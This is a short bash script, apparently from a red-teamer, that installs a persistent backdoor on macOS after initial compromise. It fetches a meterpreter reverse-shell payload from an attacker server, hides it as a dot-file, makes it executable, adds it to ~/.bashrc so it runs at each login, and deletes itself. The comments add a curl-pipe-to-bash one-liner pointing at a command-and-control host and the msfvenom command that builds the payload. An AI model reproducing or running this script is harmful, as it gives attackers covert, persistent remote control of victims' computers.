#!/usr/bin/env bash

# This script is customized. As professional red teamer i used this in a legal prenetration test.
# Once i got first access after an email with WeTransfer sending malicious .app generated with pyinstaller 
# after shell popped to me i immediatemely ran this one liner to download and execute this script:
# (you can change the namefile obv and hide .sh extension)
#
# curl -s -k https://MY_C2C_IP/osx_persistence/ | bash

# URL hosting our malicious mach-o reverse shell generated with msfvenom
# msfvenom -p osx/x64/meterpreter_reverse_https LHOST=YOUR-IP LPORT=YOUR-PORT -f macho > macho
URL="https://192.168.1.7:4443/macho"

# Randomize payload name
PAYLOAD=$RANDOM

# Add dot to make hidden file
PAYLOAD=".${PAYLOAD}"

# Download malicious mach-o from ftp over ssl.
# curl --ftp-ssl -u user:pass ftp://MY_C2C_IP:21/payloads/macho
# or
# Download from https
# This payload is our persistence reverse backdoor in mach-o format!!!
curl -k $URL -o ~/$PAYLOAD

# Want to be sure that's my payload is executable
chmod +x ~/$PAYLOAD

# Persistence in .bashrc. Our backdoor will call us after user login.
# If we kill session once established, victim neeeds to log off and log in again to get another shell,
# or just reboot.
echo "~/$PAYLOAD 2>&1" >> ~/.bashrc

# Remove itself
rm osx_persistence 2>&1
